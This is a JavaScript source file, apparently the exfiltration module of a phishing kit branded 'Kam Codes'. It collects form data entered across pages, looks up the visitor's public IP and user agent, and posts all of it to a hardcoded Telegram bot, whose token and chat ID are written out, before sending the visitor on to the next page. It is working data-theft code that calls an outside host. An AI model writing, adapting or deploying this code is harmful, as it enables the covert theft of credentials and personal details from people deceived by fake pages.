const chatId = "6112982719"; // Replace with your chat ID
const botToken = "7519398734:AAGX3-29ZjCSNL9HYzlKa29vJ4X8tiIPtt8"; // Replace with your bot token

export const sendToTelegram = async (
  sections,
  pageTitle,
  navigate,
  nextRoute
) => {
  let message = "----- Kam Codes ------\n\n";
  message += "----- logs ------\n\n";
  // message += `----- ${pageTitle} ------\n\n`; // Add page title to the message

  // Construct the message with custom sections
  sections.forEach((section) => {
    message += `----------- ${section.title} -----------\n`;
    for (const [key, value] of Object.entries(section.data)) {
      message += `${key}: ${value}\n`;
    }
    message += "\n"; // Add a line break after each section
  });

  // Get user IP
  const userIp = await fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => data.ip)
    .catch((error) => {
      console.error("Failed to get user IP:", error);
      return "Unknown IP";
    });

  // Get user agent
  const userAgent = navigator.userAgent || "Unknown User Agent";

  // Append user IP and user agent to the message
  message += `User IP: ${userIp}\n`;
  message += `User Agent: ${userAgent}\n`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if (navigate && nextRoute) {
      navigate(nextRoute); // Navigate to the next route if provided
    }
  } catch (error) {
    console.error("Error sending message:", error);
  }
};
